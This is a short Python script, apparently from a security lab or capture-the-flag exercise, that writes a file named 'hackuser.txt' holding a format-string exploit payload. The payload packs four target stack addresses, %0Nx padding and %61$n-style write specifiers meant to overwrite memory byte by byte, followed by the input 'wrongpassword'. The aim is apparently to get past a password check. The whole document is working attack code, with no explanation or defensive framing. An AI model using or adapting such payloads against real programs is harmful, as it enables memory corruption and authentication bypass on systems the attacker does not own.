
disp = 61
printdisp = [253, 250, 251, 251]

fout = open("hackuser.txt", "wb")
for i in range(4):
    lst = [128 + i]
    outstr = bytearray(lst)
    outstr.extend(b'\xcd\xff\xff')
    fout.write(outstr)
    outstr = "%0" + str(printdisp[i]) + "x"
    outstr = outstr.encode('ascii')
    fout.write(outstr)
    outstr = "%" + str(disp+i*4) + "$n."
    outstr = outstr.encode('ascii')
    fout.write(outstr)


fout.write("\nwrongpassword\n".encode('ascii'))
fout.close()
